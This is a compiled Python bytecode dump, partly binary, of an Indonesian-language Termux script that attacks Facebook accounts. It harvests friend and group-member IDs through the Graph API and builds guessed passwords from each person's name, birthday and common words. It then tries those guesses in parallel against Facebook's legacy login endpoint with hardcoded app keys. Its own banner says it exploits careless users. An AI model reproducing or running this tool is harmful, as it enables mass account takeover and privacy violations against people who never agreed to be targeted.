B
    ��$]�  �               @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZ	d dl
mZ d dlmZ e �� Ze�d� eje j�� dd� dd� Zd	Zd
d� Zg Zg ZdZd adZdd� Zdd� Zdd� Zdd� Z dd� Z!dd� Z"dd� Z#dd� Z$dd� Z%d d!� Z&e�  e�  d"e� fge_'zjy8x2e � \Z(Z)e#�  e*ee�d# � e�  e�  �qW W n, e+k
�r~ Z, ze-e,� W ddZ,[,X Y nX W de-ee�� d$ee�� d%ee�� d&�� X dS )'�    N)�choice)�
ThreadPoolF�   )Zmax_timec              C   s&   t j} tj| | ft j��  t�� }d S )N)�sys�
executable�os�execl�argv�getcwd)Zpython�curdir� r   �//data/data/com.termux/files/home/fblite/main.py�res   s    r   )z[0;1mz[1;31mz[1;32mz[1;33mz[1;34mz[1;35mz[1;36mc              C   s�   yFt dd��� } t| �dk s$| dkr@t�d� ttt�d � n| S W nT tk
r�   t	tt�d � t�d� t
tt�d	 �}t dd
��|� t�  Y nX d S )Nz	agent.txt�r�   � zrm agent.txtzOops user agent kosongz&User agent gak ada!
Kopas dari browserz6xdg-open https://pgl.yoyo.org/http/browser-headers.phpzisi user-agent: �w)�open�read�lenr   �system�exit�ch�wrn�FileNotFoundError�print�input�writer   )ZhedZswr   r   r   �heder   s    

r   )Z
first_nameZ	last_nameZusernameZmiddle_name�birthdayz\|/-c               C   s   t d� t�d� d S )Nzd



































































































�clear)r   r   r   r   r   r   r   �cls$   s    r!   c              C   s�   x`dD ]X} xDt d�D ]8}ttt�ttjtj d � d ddd� t�d� qW t| ddd� qW t	�  t
�d	tt�� d
�� d S )NzLoading... �   �.�r   T)�end�flushg{�G�z�?zecho -e -n 'z!';cowsay -f vader Selamat datang!)�ranger   r   r   �stgZascii_lettersZdigits�timeZsleepr!   r   r   )�i�nr   r   r   �wel'   s    
*r,   c             C   sR   d|kr&t td d |  d | � n(d|d krNt td d |  d | � d S )	N�access_token�   u   [✓] z : zwww.facebook.comZ	error_msg�   z[X] )r   r   )r*   �xZkyunr   r   r   �check0   s    r1   c              C   s�   t �� } d| krptdd��� }t�d| �}t�|j�}d|krbt	t
t�� d�� tt �d�� q�|d |fS ntd�}|d	kr�t�  nt�  d S )
Nz	login.txtr   z+https://graph.facebook.com/me?access_token=�errorzToken error ganzrm login.txt�namezgak ada token
login?(y|n)�y)r   �listdirr   r   �requests�get�json�loads�textr   r   r   r   r   r   �login)�aswZtodZlogZbzr   r   r   �token5   s    r=   c        	      C   sT  t tt�� dtt�� ��} t tt�� dtt�� ��}t�  t�d� dtj_tjdd� | tj	d< |tj	d< t�
�  t�� }d	|k�r.td
� d|  d | d }dd| ddddd|ddd�}t�d�}|�|�� � |�� }|�d|i� d}tj||d�}t�|j�}tdd��|d � td� t�  n"d|k�rBtd � ntd!� t�  d S )"Nz
username: z
password: zhttps://m.facebook.comTr   )Znr�email�passzsave-devicezMembuat tokenzGapi_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=z`format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=z;return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32Z 882a8490361da98702bf97a021ddc14d�passwordZJSON�1Zen_USz
auth.login�0z1.0)Zapi_keyZcredentials_typer>   �formatZgenerate_machine_idZgenerate_session_cookiesZlocale�methodr@   Zreturn_ssl_resources�vZmd5�sigz'https://api.facebook.com/restserver.php)Zparamsz	login.txtr   r-   zLOGIN BERHASIL!Z
checkpointzcheckpoint ganZgagal)r   r   r   r!   �brr   Z_factoryZis_htmlZselect_formZformZsubmitZgeturlr   �hashlib�new�update�encodeZ	hexdigestr6   r7   r8   r9   r:   r   r   r   )	�usrZpwZurlrF   �datar0   �ar   �zr   r   r   r;   G   s8    






r;   c              C   s`   yNt ttt�d tt� ��} | dkr2t�d� n| dkrFt�d� nt�  W n   Y nX d S )Nz1.WA
2.Fb
> r   z%xdg-open https://wa.me/62895640466851r.   z(xdg-open https://fb.me/mayat.mayat.58555)�intr   r   r   r   r   �nanya)Zsur   r   r   �contactf   s    
rR   c              C   s�   t tt�� dt� �� y$tttt�� dtt�� d���} W n   t�  Y nX | dkr^t�  n`| dkrnt�  nP| dkr�tt	�
d�� n8| dkr�tt	�
d	�� n | d
kr�t�  n| dkr�t�  n d S )NzNama: zM1. Akun teman
2. dari grup
3. logout
4. apus header
5. contact me
0. keluar
>� r   r.   r/   zrm login.txt�   zrm agent.txtr   r   )r   r   r   r3   rP   r   r   �tmn�grpr   r   rR   )r<   r   r   r   rQ   q   s$    $rQ   c              C   s�   t tt�d tt� �} | dkr&d}n*| dkrJt tt�� dtt�� ��}nt�  t�d| d t �}t�|j	�}x:|d D ].}t
�|d	 � ttt�d
 |d	  dd� q|W td� ttt�d tt
�� td�}|�tt
� d S )Nzmine/other: Zmine�me�otherzid fb: zhttps://graph.facebook.com/z/friends?access_token=rM   �idzMengambil id: �)r%   zMengambil id: Done!           zTotal:r"   )r   r   r   r   r6   r7   �tokr8   r9   r:   �idf�appendr   r   r   �map�crack)�kya�hzr   rO   �s�hhr   r   r   rU   �   s     rU   c        	      C   sV  d} t �dt �}t�|j�}ttt�� d��}|dk�rt	d� x8|d D ],}t	td t
| � d |d	  � | d7 } qLW ytttt�d
 ��d }W n   t�  Y nX t �d|d | d  d t �}t�|j�}x:|d D ].}t�|d � t	tt�d |d  dd� q�W �n|dk�r�x�|d D ]z}t	d|d	  � t �d|d  d t �}t�|j�}x<|d D ]0}t�|d � t	tt�d |d  dd� �qrW �q.W nr|dk�r td�}t �d| d t �}t�|j�}x<|d D ]0}t�|d � t	tt�d |d  dd� �q�W t	d� t	tt�d tt�� td�}|�tt� d S )Nr   z3https://graph.facebook.com/me/groups/?access_token=zall/one/id: Zonez$klo pilihan gk ada, pencet enter ganrM   r   z. r3   zPilih: zhttps://graph.facebook.com/rY   z /members?fields=id&access_token=zMengambil id: rZ   )r%   �allzNama: z
id group: zMengambil id: Done!           zTotal:r"   )r6   r7   r[   r8   r9   r:   r   r   r   r   �strrP   r   �idgr]   r   r   r^   r_   )	rN   r   rO   Zuwur*   Zye�kr+   rc   r   r   r   rV   �   sJ    
 "$
*
"rV   c       	      C   s�  ddddddg}t �d|  d t �}t�|j�}x�|D ]�}|tkr8|d	kr�|| �d
d�}|�|� |�|dd� |d d�  |dd �  � |�|dd � |d d�  |dd�  � |�|dd � |dd�  |d d�  � q8|�|| � |�|| d � |�|| d � q8W x�|D ]�}yxt	t
d d tt  d d dd� ttt�d k �rftd ndatj�d|  d | d �}t�|�}t| ||� W n   Y nX �q"W d S )NZsayangZ
ganteng123Zganteng12345Z	cantik123ZqwertyZ	123456789zhttps://graph.facebook.com/z/?access_token=r   �/r   r.   rT   Z123Z12345r   �[�]z	 CrackingrZ   )r%   r   z�https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=z&locale=en_US&password=zH&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6)r6   r7   r[   r8   r9   r:   �need�replacer]   r   r   �lodrN   r   �urllibZrequestZurlopen�loadr1   )	rL   ZmoeZuhZnyar*   Zvur0   Zdbr`   r   r   r   r_   �   s.    

**,
$
r_   z
User-AgentzEnter untuk lanjutz#Memanfaatkan pengguna yang ceroboh
zCTRL-Z: keluar dgn paksa
zGithub: https://git.io/fjiQH).Z	mechanizer6   r8   rH   r   r   r)   rn   Zstringr(   Zrandomr   r   Zmultiprocessing.poolr   ZBrowserrG   Zset_handle_robotsZset_handle_refreshZ_httpZHTTPRefreshProcessorr   r   r   r\   rf   rk   rN   rm   r!   r,   r1   r=   r;   rR   rQ   rU   rV   r_   Z
addheadersr3   r[   r   �	ExceptionZeeqr   r   r   r   r   �<module>   sH   H
	'
